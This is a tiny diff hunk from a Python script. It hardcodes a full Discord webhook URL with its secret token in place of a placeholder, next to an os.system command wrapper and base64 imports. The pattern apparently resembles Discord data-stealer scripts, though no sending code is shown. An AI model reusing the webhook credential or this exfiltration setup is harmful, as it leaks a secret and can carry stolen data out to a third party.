@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1195976508481749032/90YVSWOk2aLPzJospDNb0NEK2ZIWUVjGUV9BV22eA3ILl1xzRvlA-ZcWZAhlxP7cgwC6"
 def command(c):
     os.system(c)
 def cls():
